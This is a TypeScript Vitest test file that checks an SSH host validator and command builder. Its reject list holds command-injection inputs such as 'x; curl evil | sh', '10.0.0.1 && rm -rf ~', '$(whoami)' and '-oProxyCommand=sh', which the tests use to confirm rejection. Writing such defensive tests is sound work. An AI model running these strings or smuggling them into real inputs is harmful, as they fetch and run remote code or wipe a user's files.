import { describe, expect, it } from "vitest"
import { buildSshCommand, isValidSshHost } from "@/lib/devices/ssh-host"
import { sshHostSchema } from "@/lib/validations/machine"

describe("ssh host validation", () => {
	it.each(["10.10.0.12", "bb-01.wg.internal", "fd00::12", "[fd00::12]", "radxa"])("accepts %s", (host) => {
		expect(isValidSshHost(host)).toBe(true)
		expect(sshHostSchema.safeParse(host).success).toBe(true)
	})

	it.each([
		"x; curl evil | sh",
		"10.0.0.1 && rm -rf ~",
		"$(whoami)",
		"`id`",
		"-oProxyCommand=sh",
		"host name",
		"host\nrm",
		"",
	])("rejects %j", (host) => {
		expect(isValidSshHost(host)).toBe(false)
		expect(sshHostSchema.safeParse(host).success).toBe(false)
	})

	it("falls back to a placeholder for stored unsafe hosts", () => {
		expect(buildSshCommand("bbops", "x; rm -rf ~")).toBe("ssh bbops@<ssh-host>")
		expect(buildSshCommand("bbops", null)).toBe("ssh bbops@<ssh-host>")
		expect(buildSshCommand("bbops", "10.10.0.12")).toBe("ssh bbops@10.10.0.12")
	})
})
